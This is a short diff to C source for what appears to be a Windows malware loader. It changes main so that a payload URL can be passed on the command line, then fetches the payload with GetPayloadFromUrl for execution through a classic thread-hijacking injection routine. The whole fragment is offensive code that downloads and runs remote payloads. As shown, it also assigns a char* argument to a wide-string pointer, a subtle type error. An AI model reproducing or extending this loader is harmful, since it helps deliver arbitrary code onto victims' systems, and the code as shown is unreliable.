@@ -134,13 +134,21 @@ BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_
 	return TRUE;
 }
 
-int main()
+int main(int argc, char* argv[])
 {
+	PWSTR pUrl = NULL;
+
+	if (argc == 2) {
+		pUrl = argv[1];
+	}
+	else {
+		pUrl = PAYLOAD;
+	}
 
 	SIZE_T Size = NULL;
 	PBYTE Bytes = NULL;
 
-	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
+	if (!GetPayloadFromUrl(pUrl, &Bytes, &Size)) {
 		return -1;
 	}
 
